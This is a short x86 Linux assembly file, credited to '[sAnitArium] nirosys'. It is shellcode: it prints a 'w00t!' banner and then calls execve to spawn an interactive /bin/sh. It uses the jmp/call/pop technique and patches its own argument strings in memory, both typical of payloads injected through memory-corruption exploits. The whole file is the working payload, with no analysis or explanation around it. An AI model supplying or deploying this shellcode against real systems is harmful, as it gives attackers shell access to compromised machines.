.data
.NAME:
	.string "[sAnitArium] nirosys - lnx-nirocode-hax0r-sh.s"
.text
.globl _start

_start:

	jmp	wdata	/* Jump to our data */	
dowrite:
	popl	%esi
	/* Init * * * * * * * * * * * * * * */
	xorl	%eax, %eax
	xorl	%ebx, %ebx
	xorl	%edx, %edx
	/* Write * * * * * * * * * * * * * * */
	movb	$0x04, %al
	movb	$0x01, %bl
	movl	%esi, %ecx
	movb	$31, %dl
	int	$0x80

	/* execve * * * * * * * * * * * * * */
	jmp	edata
doexec:
	popl	%esi		/* Regain new data */
	movl	%esi, 0xb(%esi)
	xorl	%eax, %eax	/* Clear eax */

	/* terminate strings * * * * * * * * */
	movb	%al, 0x7(%esi)  /* Write 1st NULL byte */ 
	movb	%al, 0xa(%esi)	/* Write 2nd NULL byte */
	
	/* Grab addresses * * * * * * * * * * */
	movl	%esi, 11(%esi)  /* Store pointer 1 */
	leal	0x8(%esi), %ebx /* Get address of pointer 2 */
	movl	%ebx, 15(%esi)  /* Store pointer 2 */
	movl	%eax, 19(%esi)  /* Store NULL for pointer 3 */

	/* Set params * * * * * * * * * * * * */
	movl	%esi, %ebx      /* Set First Param */
	leal	11(%esi), %ecx  /* Set Second Param */
	xorl	%edx, %edx	/* Set Third Param */
	movb	$0x0b, %al
	int	$0x80
	
wdata:
	call	dowrite
	.string "[sAnitArium] nirosys - w00t!"
	.string "\x0A\x0D"
edata:
	call	doexec
	.string "/bin/sh#-i#AAAABBBBCCCC"
